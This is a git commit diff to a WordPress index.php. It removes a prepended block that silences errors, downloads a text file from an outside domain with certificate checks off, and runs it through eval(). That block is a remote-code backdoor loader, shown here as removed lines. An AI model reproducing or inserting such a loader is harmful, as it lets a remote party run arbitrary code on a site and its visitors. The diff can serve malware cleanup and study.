675828ca3c126975180b23c147141ae36f862851
nyamukbesi <maboktuak21@gmail.com>
2024-10-11 01:00:09 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,24 +1,4 @@
 <?php
-error_reporting(0);
-function get_contents($url){
-  $ch = curl_init("$url");
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
-  curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
-  $result = curl_exec($ch);
-  return $result;
-}?>
-<?php
-$a =
-get_contents('https://ribaksudehospital.com/landing/wallmaster/wallmaster.txt');
-eval('?>'.$a);
-?>
-
-<?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
